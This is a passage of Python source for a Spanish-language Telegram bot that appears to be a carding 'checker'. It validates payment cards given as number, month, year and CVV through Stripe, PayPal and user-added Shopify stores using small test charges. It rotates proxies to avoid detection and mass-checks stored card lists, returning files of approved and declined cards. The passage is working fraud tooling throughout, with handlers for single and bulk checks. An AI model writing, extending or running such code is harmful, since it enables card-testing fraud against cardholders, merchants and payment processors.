        "║  • PayPal: $10/$0.10/$1    ║\n"
        "║  • AutoShopify: variable   ║\n"
        "║                            ║\n"
        "║  Proxies:                   ║\n"
        "║  • Envía archivo .txt       ║\n"
        "║  • /px - Testear proxies    ║\n"
        "║                            ║\n"
        "║  Sitios Shopify:            ║\n"
        "║  • /addsh URL - Agregar    ║\n"
        "║  • /sitios - Listar        ║\n"
        "║                            ║\n"
        "║  Comandos rápidos:          ║\n"
        "║  /check CC - Stripe $1     ║\n"
        "║  /check134 CC - Stripe $1.34║\n"
        "║  /pp CC - PayPal $10       ║\n"
        "║  /pp2 CC - PayPal $0.10    ║\n"
        "║  /pp3 CC - PayPal $1       ║\n"
        "║  /sh CC - AutoShopify      ║\n"
        "║  /mass - Stripe $1 masivo  ║\n"
        "║  /mass134 - Stripe $1.34 masivo║\n"
        "║  /mpp - PayPal masivo      ║\n"
        "║  /msh - Shopify masivo     ║\n"
        "╚════════════════════════════╝\n\n"
        "Selecciona una opción:"
    )
    bot.send_message(message.chat.id, texto, reply_markup=menu_principal())

@bot.message_handler(commands=['help'])
def cmd_help(message):
    texto = (
        "╔════════════════════════════╗\n"
        "║        ❓ AYUDA             ║\n"
        "╠════════════════════════════╣\n"
        "║  • Usa los botones para    ║\n"
        "║    navegar por el menú     ║\n"
        "║                            ║\n"
        "║  • Comandos individuales:  ║\n"
        "║    /check CC - Stripe $1   ║\n"
        "║    /check134 CC - Stripe $1.34║\n"
        "║    /pp CC - PayPal $10     ║\n"
        "║    /pp2 CC - PayPal $0.10  ║\n"
        "║    /pp3 CC - PayPal $1     ║\n"
        "║    /sh CC - AutoShopify    ║\n"
        "║                            ║\n"
        "║  • Comandos masivos:       ║\n"
        "║    /mass - Stripe $1 masivo║\n"
        "║    /mass134 - Stripe $1.34 masivo║\n"
        "║    /mpp - PayPal masivo    ║\n"
        "║    /msh - Shopify masivo   ║\n"
        "║                            ║\n"
        "║  • Sitios Shopify:          ║\n"
        "║    /addsh URL - Agregar    ║\n"
        "║    /sitios - Listar        ║\n"
        "║    /delsh URL - Eliminar   ║\n"
        "║                            ║\n"
        "║  • Proxies:                 ║\n"
        "║    Envía archivo .txt       ║\n"
        "║    /px - Testear proxies    ║\n"
        "║    /proxies - Ver lista     ║\n"
        "║                            ║\n"
        "║  • Otros comandos:         ║\n"
        "║    /bin BIN - Consultar BIN║\n"
        "║    /stats - Estadísticas   ║\n"
        "╚════════════════════════════╝"
    )
    bot.reply_to(message, texto)

@bot.message_handler(commands=['addsh'])
def cmd_add_sitio(message):
    """Agrega un sitio Shopify"""
    try:
        url = message.text.split()[1]
        if guardar_sitio(url):
            bot.reply_to(message, f"✅ Sitio guardado:\n{url}")
        else:
            bot.reply_to(message, "❌ Error: El sitio ya existe o URL inválida")
    except IndexError:
        bot.reply_to(message, "❌ Uso: /addsh https://tienda.myshopify.com")

@bot.message_handler(commands=['sitios'])
def cmd_listar_sitios(message):
    """Lista todos los sitios Shopify"""
    sitios = obtener_sitios_con_estadisticas()
    
    if not sitios:
        bot.send_message(message.chat.id, "📭 No hay sitios guardados")
        return
    
    texto = "╔════════════════════════════╗\n║     🛍️ MIS SITIOS        ║\n╠════════════════════════════╣\n"
    
    for url, succ, fail, last_used in sitios[:10]:
        url_short = url[:25] + "..." if len(url) > 25 else url
        total = succ + fail
        tasa = (succ/total*100) if total > 0 else 0
        
        texto += f"║ {url_short:<28} ║\n║    ├─ ✅ {succ}  ❌ {fail}        ║\n║    └─ 📊 {tasa:.1f}%            ║\n"
    
    texto += "╚════════════════════════════╝"
    bot.send_message(message.chat.id, texto, reply_markup=menu_shopify())

@bot.message_handler(commands=['delsh'])
def cmd_del_sitio(message):
    """Elimina un sitio Shopify"""
    try:
        url = message.text.split()[1]
        if eliminar_sitio(url):
            bot.reply_to(message, f"✅ Sitio eliminado: {url[:30]}...")
        else:
            bot.reply_to(message, "❌ Sitio no encontrado")
    except IndexError:
        bot.reply_to(message, "❌ Uso: /delsh https://tienda.myshopify.com")

@bot.message_handler(commands=['delallsitios'])
def cmd_del_all_sitios(message):
    """Elimina TODOS los sitios"""
    confirmacion = types.InlineKeyboardMarkup()
    btn1 = types.InlineKeyboardButton("✅ Sí, eliminar todos", callback_data='confirm_del_all_sitios')
    btn2 = types.InlineKeyboardButton("❌ No, cancelar", callback_data='cancel_del_all_sitios')
    confirmacion.add(btn1, btn2)
    
    bot.reply_to(
        message, 
        "⚠️ *¿ESTÁS SEGURO?*\n\nEsto eliminará TODOS los sitios guardados permanentemente.",
        parse_mode='Markdown',
        reply_markup=confirmacion
    )

# ==================== COMANDOS DE VERIFICACIÓN STRIPE $1 ====================

@bot.message_handler(commands=['check'])
def cmd_check(message):
    """Verificar con Stripe $1.00"""
    try:
        cc = message.text.split()[1]
        
        partes = cc.split('|')
        if len(partes) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
            return
        
        numero = partes[0]
        bin_num = numero[:6]
        
        msg = bot.reply_to(message, "🔍 Verificando con Stripe $1.00...")
        
        bin_info = consultar_bin(bin_num)
        user_name = message.from_user.first_name if message.from_user else "User"
        
        proxies = obtener_proxies()
        mejor_resultado = None
        
        if proxies:
            for proxy in proxies[:3]:
                resultado = verificar_api_stripe(cc, proxy)
                if not mejor_resultado or (resultado['status'] == 'success' and mejor_resultado['status'] != 'success'):
                    mejor_resultado = resultado
                time.sleep(1)
        else:
            mejor_resultado = verificar_api_stripe(cc)
        
        if mejor_resultado:
            guardar_historial(cc, mejor_resultado['proxy'], 'Stripe', mejor_resultado['amount'], 
                            mejor_resultado['status'], mejor_resultado['message'], mejor_resultado['gates'], bin_info)
            
            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "Stripe $1.00")
            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /check NUMERO|MES|AÑO|CVV")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ==================== NUEVO COMANDO PARA STRIPE $1.34 ====================

@bot.message_handler(commands=['check134', 'ch134'])
def cmd_check_134(message):
    """Verificar con Stripe $1.34"""
    try:
        cc = message.text.split()[1]
        
        partes = cc.split('|')
        if len(partes) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
            return
        
        numero = partes[0]
        bin_num = numero[:6]
        
        msg = bot.reply_to(message, "🔍 Verificando con Stripe $1.34 (Gate 2)...")
        
        bin_info = consultar_bin(bin_num)
        user_name = message.from_user.first_name if message.from_user else "User"
        
        proxies = obtener_proxies()
        mejor_resultado = None
        
        if proxies:
            for proxy in proxies[:3]:
                resultado = verificar_api_stripe_134(cc, proxy)
                if not mejor_resultado or (resultado['status'] == 'success' and mejor_resultado['status'] != 'success'):
                    mejor_resultado = resultado
                time.sleep(1)
        else:
            mejor_resultado = verificar_api_stripe_134(cc)
        
        if mejor_resultado:
            guardar_historial(cc, mejor_resultado['proxy'], 'Stripe $1.34', mejor_resultado['amount'], 
                            mejor_resultado['status'], mejor_resultado['message'], mejor_resultado['gates'], bin_info)
            
            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "Stripe $1.34")
            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /check134 NUMERO|MES|AÑO|CVV")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ==================== COMANDOS DE VERIFICACIÓN PAYPAL ====================

@bot.message_handler(commands=['pp'])
def cmd_pp(message):
    """Verificar con PayPal $10.00"""
    try:
        cc = message.text.split()[1]
        
        partes = cc.split('|')
        if len(partes) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
            return
        
        numero = partes[0]
        bin_num = numero[:6]
        
        msg = bot.reply_to(message, "🔍 Verificando con PayPal $10.00...")
        
        bin_info = consultar_bin(bin_num)
        user_name = message.from_user.first_name if message.from_user else "User"
        
        proxies = obtener_proxies()
        mejor_resultado = None
        
        if proxies:
            for proxy in proxies[:3]:
                resultado = verificar_api_paypal(cc, gate=1, proxy=proxy)
                if not mejor_resultado or (resultado['status'] == 'success' and mejor_resultado['status'] != 'success'):
                    mejor_resultado = resultado
                time.sleep(1)
        else:
            mejor_resultado = verificar_api_paypal(cc, gate=1)
        
        if mejor_resultado:
            guardar_historial(cc, mejor_resultado['proxy'], 'PayPal $10', mejor_resultado['amount'], 
                            mejor_resultado['status'], mejor_resultado['message'], mejor_resultado['gates'], bin_info)
            
            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "PayPal $10")
            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /pp NUMERO|MES|AÑO|CVV")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['pp2'])
def cmd_pp2(message):
    """Verificar con PayPal $0.10"""
    try:
        cc = message.text.split()[1]
        
        partes = cc.split('|')
        if len(partes) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
            return
        
        numero = partes[0]
        bin_num = numero[:6]
        
        msg = bot.reply_to(message, "🔍 Verificando con PayPal $0.10...")
        
        bin_info = consultar_bin(bin_num)
        user_name = message.from_user.first_name if message.from_user else "User"
        
        proxies = obtener_proxies()
        mejor_resultado = None
        
        if proxies:
            for proxy in proxies[:3]:
                resultado = verificar_api_paypal(cc, gate=2, proxy=proxy)
                if not mejor_resultado or (resultado['status'] == 'success' and mejor_resultado['status'] != 'success'):
                    mejor_resultado = resultado
                time.sleep(1)
        else:
            mejor_resultado = verificar_api_paypal(cc, gate=2)
        
        if mejor_resultado:
            guardar_historial(cc, mejor_resultado['proxy'], 'PayPal $0.10', mejor_resultado['amount'], 
                            mejor_resultado['status'], mejor_resultado['message'], mejor_resultado['gates'], bin_info)
            
            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "PayPal $0.10")
            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /pp2 NUMERO|MES|AÑO|CVV")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['pp3'])
def cmd_pp3(message):
    """Verificar con PayPal $1.00"""
    try:
        cc = message.text.split()[1]
        
        partes = cc.split('|')
        if len(partes) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
            return
        
        numero = partes[0]
        bin_num = numero[:6]
        
        msg = bot.reply_to(message, "🔍 Verificando con PayPal $1.00...")
        
        bin_info = consultar_bin(bin_num)
        user_name = message.from_user.first_name if message.from_user else "User"
        
        proxies = obtener_proxies()
        mejor_resultado = None
        
        if proxies:
            for proxy in proxies[:3]:
                resultado = verificar_api_paypal(cc, gate=3, proxy=proxy)
                if not mejor_resultado or (resultado['status'] == 'success' and mejor_resultado['status'] != 'success'):
                    mejor_resultado = resultado
                time.sleep(1)
        else:
            mejor_resultado = verificar_api_paypal(cc, gate=3)
        
        if mejor_resultado:
            guardar_historial(cc, mejor_resultado['proxy'], 'PayPal $1', mejor_resultado['amount'], 
                            mejor_resultado['status'], mejor_resultado['message'], mejor_resultado['gates'], bin_info)
            
            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "PayPal $1")
            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /pp3 NUMERO|MES|AÑO|CVV")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ==================== COMANDOS DE VERIFICACIÓN AUTOSHOPIFY ====================

@bot.message_handler(commands=['sh'])
def cmd_shopify(message):
    """Verificar con AutoShopify"""
    try:
        partes = message.text.split()
        cc = partes[1]
        
        # Validar formato de tarjeta
        if len(cc.split('|')) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
            return
        
        # Obtener sitios disponibles
        sitios = obtener_sitios()
        
        if not sitios:
            bot.reply_to(message, "❌ No hay sitios guardados. Usa /addsh para agregar uno.")
            return
        
        # Si se proporciona URL específica
        if len(partes) == 3:
            url = partes[2]
            if url not in sitios:
                bot.reply_to(message, "❌ Sitio no encontrado en tu lista")
                return
        else:
            # Seleccionar sitio aleatorio
            url = random.choice(sitios)
        
        numero = cc.split('|')[0]
        bin_num = numero[:6]
        
        msg = bot.reply_to(message, f"🔍 Verificando con AutoShopify...\nSitio: {url[:30]}...")
        
        bin_info = consultar_bin(bin_num)
        user_name = message.from_user.first_name if message.from_user else "User"
        
        proxies = obtener_proxies()
        mejor_resultado = None
        
        if proxies:
            for proxy in proxies[:3]:
                resultado = verificar_api_autoshopify(cc, url, proxy)
                if not mejor_resultado or resultado['success']:
                    mejor_resultado = resultado
                time.sleep(1)
        else:
            mejor_resultado = verificar_api_autoshopify(cc, url)
        
        if mejor_resultado:
            guardar_historial(cc, mejor_resultado['proxy'], f"Shopify ${mejor_resultado['amount']}", 
                            mejor_resultado['amount'], mejor_resultado['status'], 
                            mejor_resultado['message'], mejor_resultado['gates'], bin_info)
            
            # Actualizar estadísticas del sitio
            actualizar_estadisticas_sitio(url, mejor_resultado['success'])
            
            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "Shopify")
            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /sh NUMERO|MES|AÑO|CVV [URL]")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ==================== VERIFICACIÓN MASIVA STRIPE $1 ====================

@bot.message_handler(commands=['mass'])
def cmd_mass_stripe(message):
    """Verificación masiva con Stripe $1.00"""
    
    tarjetas = obtener_todas_tarjetas()
    
    if not tarjetas:
        bot.reply_to(message, "📭 No hay tarjetas guardadas")
        return
    
    # Procesar opciones
    texto = message.text.split()
    delay = 2
    notificar_cada = 10
    
    for i, arg in enumerate(texto):
        if arg == '--delay' and i+1 < len(texto):
            try:
                delay = int(texto[i+1])
            except:
                pass
        elif arg == '--notificar' and i+1 < len(texto):
            try:
                notificar_cada = int(texto[i+1])
            except:
                pass
    
    proxies = obtener_proxies()
    if not proxies:
        bot.reply_to(message, "⚠️ Sin proxies - Usando modo gestionado")
    
    task_id = f"mass_{datetime.now().strftime('%Y%m%d%H%M%S')}_{random.randint(1000,9999)}"
    
    active_tasks[task_id] = {
        'chat_id': message.chat.id,
        'cancel': False
    }
    
    config = f"""📋 VERIFICACIÓN MASIVA STRIPE $1
━━━━━━━━━━━━━━━━━━━━━━
📌 Tarjetas: {len(tarjetas)}
⏱️ Delay: {delay}s
🔔 Notificar: cada {notificar_cada}
🆔 ID: {task_id}

/cancelar_{task_id} - Cancelar"""
    
    bot.reply_to(message, config)
    
    thread = Thread(target=procesar_verificacion_masiva_stripe, 
                   args=(task_id, message.chat.id, delay, notificar_cada))
    thread.daemon = True
    thread.start()

def procesar_verificacion_masiva_stripe(task_id, chat_id, delay, notificar_cada):
    """Procesa verificación masiva con Stripe $1"""
    
    cards = [c[0] for c in obtener_todas_tarjetas()]
    total = len(cards)
    
    if total == 0:
        bot.send_message(chat_id, "📭 No hay tarjetas guardadas")
        return
    
    msg = bot.send_message(chat_id, "🔄 Iniciando verificación...")
    
    procesadas = 0
    resultados = {'success': 0, 'failed': 0, 'error': 0}
    detalles = []
    start_time = time.time()
    
    for i, card in enumerate(cards, 1):
        if task_id in active_tasks and active_tasks[task_id].get('cancel'):
            bot.edit_message_text("🛑 Cancelado", chat_id, msg.message_id)
            break
        
        bin_info = consultar_bin(card[:6])
        proxies = obtener_proxies()
        
        mejor_resultado = None
        if proxies:
            for proxy in proxies[:2]:
                resultado = verificar_api_stripe(card, proxy)
                if not mejor_resultado or resultado['status'] == 'success':
                    mejor_resultado = resultado
                time.sleep(0.5)
        else:
            mejor_resultado = verificar_api_stripe(card)
        
        if mejor_resultado:
            guardar_historial(card, mejor_resultado['proxy'], 'Stripe', mejor_resultado['amount'], 
                            mejor_resultado['status'], mejor_resultado['message'], mejor_resultado['gates'], bin_info)
            
            if mejor_resultado['status'] == 'success':
                resultados['success'] += 1
                estado_emoji = "✅"
            elif mejor_resultado['status'] == 'failed':
                resultados['failed'] += 1
                estado_emoji = "❌"
            else:
                resultados['error'] += 1
                estado_emoji = "⚠️"
            
            # Guardar detalle
            detalles.append(f"{estado_emoji} {card} | {mejor_resultado['status']} | {mejor_resultado['message'][:50]} | {mejor_resultado['proxy']}")
        else:
            detalles.append(f"❌ {card} | ERROR")
        
        procesadas = i
        
        # Actualizar cada N tarjetas
        if i % notificar_cada == 0 or i == total:
            porcentaje = (i / total) * 100
            barra = "█" * int(porcentaje/10) + "░" * (10 - int(porcentaje/10))
            
            texto = f"""📊 PROGRESO: {i}/{total}
{barra} {porcentaje:.0f}%

✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}"""
            
            try:
                bot.edit_message_text(texto, chat_id, msg.message_id)
            except:
                pass
        
        if delay > 0 and i < total:
            time.sleep(delay)
    
    # Generar archivo de resultados
    tiempo_total = time.time() - start_time
    minutos = int(tiempo_total // 60)
    segundos = int(tiempo_total % 60)
    
    filename = f"resultados_stripe_{task_id}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(f"RESULTADOS VERIFICACIÓN STRIPE $1\n")
        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total tarjetas: {total}\n")
        f.write(f"Tiempo: {minutos}m {segundos}s\n")
        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
        f.write(f"✅ Aprobadas: {resultados['success']}\n")
        f.write(f"❌ Declinadas: {resultados['failed']}\n")
        f.write(f"⚠️ Errores: {resultados['error']}\n\n")
        f.write(f"━━━━ DETALLES ━━━━━━━━━━━━━━\n\n")
        for d in detalles:
            f.write(f"{d}\n")
    
    # Mensaje final
    texto_final = f"""✅ VERIFICACIÓN STRIPE $1 COMPLETADA
━━━━━━━━━━━━━━━━━━━━━━
📊 RESULTADOS:
✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}
⏱️ Tiempo: {minutos}m {segundos}s

📁 Se generó archivo con detalles"""
    
    try:
        bot.edit_message_text(texto_final, chat_id, msg.message_id)
    except:
        bot.send_message(chat_id, texto_final)
    
    # Enviar archivo
    with open(filename, 'rb') as f:
        bot.send_document(chat_id, f, caption=f"📊 Resultados Stripe $1 - {total} tarjetas")
    
    os.remove(filename)
    
    time.sleep(300)
    if task_id in active_tasks:
        del active_tasks[task_id]

# ==================== NUEVA VERIFICACIÓN MASIVA STRIPE $1.34 ====================

@bot.message_handler(commands=['mass134'])
def cmd_mass_stripe_134(message):
    """Verificación masiva con Stripe $1.34"""
    
    tarjetas = obtener_todas_tarjetas()
    
    if not tarjetas:
        bot.reply_to(message, "📭 No hay tarjetas guardadas")
        return
    
    # Procesar opciones
    texto = message.text.split()
    delay = 2
    notificar_cada = 10
    
    for i, arg in enumerate(texto):
        if arg == '--delay' and i+1 < len(texto):
            try:
                delay = int(texto[i+1])
            except:
                pass
        elif arg == '--notificar' and i+1 < len(texto):
            try:
                notificar_cada = int(texto[i+1])
            except:
                pass
    
    proxies = obtener_proxies()
    if not proxies:
        bot.reply_to(message, "⚠️ Sin proxies - Usando modo gestionado")
    
    task_id = f"mass134_{datetime.now().strftime('%Y%m%d%H%M%S')}_{random.randint(1000,9999)}"
    
    active_tasks[task_id] = {
        'chat_id': message.chat.id,
        'cancel': False
    }
    
    config = f"""📋 VERIFICACIÓN MASIVA STRIPE $1.34 (GATE 2)
━━━━━━━━━━━━━━━━━━━━━━
📌 Tarjetas: {len(tarjetas)}
⏱️ Delay: {delay}s
🔔 Notificar: cada {notificar_cada}
🆔 ID: {task_id}

/cancelar_{task_id} - Cancelar"""
    
    bot.reply_to(message, config)
    
    thread = Thread(target=procesar_verificacion_masiva_stripe_134, 
                   args=(task_id, message.chat.id, delay, notificar_cada))
    thread.daemon = True
    thread.start()

def procesar_verificacion_masiva_stripe_134(task_id, chat_id, delay, notificar_cada):
    """Procesa verificación masiva con Stripe $1.34"""
    
    cards = [c[0] for c in obtener_todas_tarjetas()]
    total = len(cards)
    
    if total == 0:
        bot.send_message(chat_id, "📭 No hay tarjetas guardadas")
        return
    
    msg = bot.send_message(chat_id, "🔄 Iniciando verificación Stripe $1.34...")
    
    procesadas = 0
    resultados = {'success': 0, 'failed': 0, 'error': 0}
    detalles = []
    start_time = time.time()
    
    for i, card in enumerate(cards, 1):
        if task_id in active_tasks and active_tasks[task_id].get('cancel'):
            bot.edit_message_text("🛑 Cancelado", chat_id, msg.message_id)
            break
        
        bin_info = consultar_bin(card[:6])
        proxies = obtener_proxies()
        
        mejor_resultado = None
        if proxies:
            for proxy in proxies[:2]:
                resultado = verificar_api_stripe_134(card, proxy)
                if not mejor_resultado or resultado['status'] == 'success':
                    mejor_resultado = resultado
                time.sleep(0.5)
        else:
            mejor_resultado = verificar_api_stripe_134(card)
        
        if mejor_resultado:
            guardar_historial(card, mejor_resultado['proxy'], 'Stripe $1.34', mejor_resultado['amount'], 
                            mejor_resultado['status'], mejor_resultado['message'], mejor_resultado['gates'], bin_info)
            
            if mejor_resultado['status'] == 'success':
                resultados['success'] += 1
                estado_emoji = "✅"
            elif mejor_resultado['status'] == 'failed':
                resultados['failed'] += 1
                estado_emoji = "❌"
            else:
                resultados['error'] += 1
                estado_emoji = "⚠️"
            
            # Guardar detalle
            detalles.append(f"{estado_emoji} {card} | {mejor_resultado['status']} | {mejor_resultado['message'][:50]} | {mejor_resultado['proxy']}")
        else:
            detalles.append(f"❌ {card} | ERROR")
        
        procesadas = i
        
        # Actualizar cada N tarjetas
        if i % notificar_cada == 0 or i == total:
            porcentaje = (i / total) * 100
            barra = "█" * int(porcentaje/10) + "░" * (10 - int(porcentaje/10))
            
            texto = f"""📊 PROGRESO: {i}/{total}
{barra} {porcentaje:.0f}%

✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}"""
            
            try:
                bot.edit_message_text(texto, chat_id, msg.message_id)
            except:
                pass
        
        if delay > 0 and i < total:
            time.sleep(delay)
    
    # Generar archivo de resultados
    tiempo_total = time.time() - start_time
    minutos = int(tiempo_total // 60)
    segundos = int(tiempo_total % 60)
    
    filename = f"resultados_stripe134_{task_id}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(f"RESULTADOS VERIFICACIÓN STRIPE $1.34\n")
        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total tarjetas: {total}\n")
        f.write(f"Tiempo: {minutos}m {segundos}s\n")
        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
        f.write(f"✅ Aprobadas: {resultados['success']}\n")
        f.write(f"❌ Declinadas: {resultados['failed']}\n")
        f.write(f"⚠️ Errores: {resultados['error']}\n\n")
        f.write(f"━━━━ DETALLES ━━━━━━━━━━━━━━\n\n")
        for d in detalles:
            f.write(f"{d}\n")
    
    # Mensaje final
    texto_final = f"""✅ VERIFICACIÓN STRIPE $1.34 COMPLETADA
━━━━━━━━━━━━━━━━━━━━━━
📊 RESULTADOS:
✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}
⏱️ Tiempo: {minutos}m {segundos}s

📁 Se generó archivo con detalles"""
    
    try:
        bot.edit_message_text(texto_final, chat_id, msg.message_id)
    except:
        bot.send_message(chat_id, texto_final)
    
    # Enviar archivo
    with open(filename, 'rb') as f:
        bot.send_document(chat_id, f, caption=f"📊 Resultados Stripe $1.34 - {total} tarjetas")
    
    os.remove(filename)
    
    time.sleep(300)
    if task_id in active_tasks:
        del active_tasks[task_id]

# ==================== VERIFICACIÓN MASIVA PAYPAL ====================

@bot.message_handler(commands=['mpp'])
def cmd_mass_paypal(message):
    """Verificación masiva con PayPal (3 gates)"""
    
    tarjetas = obtener_todas_tarjetas()
    
    if not tarjetas:
        bot.reply_to(message, "📭 No hay tarjetas guardadas")
        return
    
    # Procesar opciones
    texto = message.text.split()
    delay = 3
    notificar_cada = 10
    
    for i, arg in enumerate(texto):
        if arg == '--delay' and i+1 < len(texto):
            try:
                delay = int(texto[i+1])
            except:
                pass
        elif arg == '--notificar' and i+1 < len(texto):
            try:
                notificar_cada = int(texto[i+1])
            except:
                pass
    
    proxies = obtener_proxies()
    if not proxies:
        bot.reply_to(message, "⚠️ Sin proxies - Usando modo gestionado")
    
    task_id = f"mpp_{datetime.now().strftime('%Y%m%d%H%M%S')}_{random.randint(1000,9999)}"
    
    active_tasks[task_id] = {
        'chat_id': message.chat.id,
        'cancel': False
    }
    
    config = f"""💰 VERIFICACIÓN MASIVA PAYPAL
━━━━━━━━━━━━━━━━━━━━━━
📌 Tarjetas: {len(tarjetas)}
🔄 Gates: $10 | $0.10 | $1
⏱️ Delay: {delay}s
🔔 Notificar: cada {notificar_cada}
🆔 ID: {task_id}

/cancelar_{task_id} - Cancelar"""
    
    bot.reply_to(message, config)
    
    thread = Thread(target=procesar_verificacion_masiva_paypal, 
                   args=(task_id, message.chat.id, delay, notificar_cada))
    thread.daemon = True
    thread.start()

def procesar_verificacion_masiva_paypal(task_id, chat_id, delay, notificar_cada):
    """Procesa verificación masiva con PayPal"""
    
    cards = [c[0] for c in obtener_todas_tarjetas()]
    total = len(cards)
    
    if total == 0:
        bot.send_message(chat_id, "📭 No hay tarjetas guardadas")
        return
    
    msg = bot.send_message(chat_id, "🔄 Iniciando verificación PayPal...")
    
    procesadas = 0
    resultados = {
        'paypal10': {'success': 0, 'failed': 0, 'error': 0},
        'paypal01': {'success': 0, 'failed': 0, 'error': 0},
        'paypal1': {'success': 0, 'failed': 0, 'error': 0},
        'total_aprobadas': 0
    }
    detalles = []
    start_time = time.time()
    
    for i, card in enumerate(cards, 1):
        if task_id in active_tasks and active_tasks[task_id].get('cancel'):
            bot.edit_message_text("🛑 Cancelado", chat_id, msg.message_id)
            break
        
        bin_info = consultar_bin(card[:6])
        proxies = obtener_proxies()
        
        respuestas = {}
        
        # Probar los 3 gates
        for gate in [1, 2, 3]:
            gate_name = {1: "PayPal $10", 2: "PayPal $0.10", 3: "PayPal $1"}[gate]
            
            if proxies:
                for proxy in proxies[:1]:
                    res = verificar_api_paypal(card, gate=gate, proxy=proxy)
                    respuestas[gate_name] = res
                    time.sleep(0.5)
            else:
                res = verificar_api_paypal(card, gate=gate)
                respuestas[gate_name] = res
        
        # Analizar resultados y guardar respuestas
        mejor_general = None
        gate_key_map = {
            "PayPal $10": 'paypal10',
            "PayPal $0.10": 'paypal01',
            "PayPal $1": 'paypal1'
        }
        
        for gate_name, res in respuestas.items():
            gate_key = gate_key_map[gate_name]
            
            if res['status'] == 'success':
                resultados[gate_key]['success'] += 1
                if not mejor_general:
                    mejor_general = res
            elif res['status'] == 'failed':
                resultados[gate_key]['failed'] += 1
            else:
                resultados[gate_key]['error'] += 1
        
        if mejor_general:
            resultados['total_aprobadas'] += 1
            guardar_historial(card, mejor_general['proxy'], mejor_general['gate_name'], 
                            mejor_general['amount'], mejor_general['status'], 
                            mejor_general['message'], mejor_general['gates'], bin_info)
            
            # Detalle con respuestas reales
            detalle = f"""✅ {card}
   ├─ 💵 $10: {respuestas['PayPal $10']['message'][:50]}
   ├─ 🪙 $0.10: {respuestas['PayPal $0.10']['message'][:50]}
   └─ 💎 $1: {respuestas['PayPal $1']['message'][:50]}"""
        else:
            # Detalle cuando todos declinan - CON RESPUESTAS REALES
            detalle = f"""❌ {card}
   ├─ 💵 $10: {respuestas['PayPal $10']['message'][:50]}
   ├─ 🪙 $0.10: {respuestas['PayPal $0.10']['message'][:50]}
   └─ 💎 $1: {respuestas['PayPal $1']['message'][:50]}"""
        
        detalles.append(detalle)
        procesadas = i
        
        # Actualizar cada N tarjetas
        if i % notificar_cada == 0 or i == total:
            porcentaje = (i / total) * 100
            barra = "█" * int(porcentaje/10) + "░" * (10 - int(porcentaje/10))
            
            texto = f"""📊 PROGRESO: {i}/{total}
{barra} {porcentaje:.0f}%

💵 $10: ✅{resultados['paypal10']['success']} ❌{resultados['paypal10']['failed']}
🪙 $0.10: ✅{resultados['paypal01']['success']} ❌{resultados['paypal01']['failed']}
💎 $1: ✅{resultados['paypal1']['success']} ❌{resultados['paypal1']['failed']}

✅ Aprobadas únicas: {resultados['total_aprobadas']}"""
            
            try:
                bot.edit_message_text(texto, chat_id, msg.message_id)
            except:
                pass
        
        if delay > 0 and i < total:
            time.sleep(delay)
    
    # Generar archivo de resultados
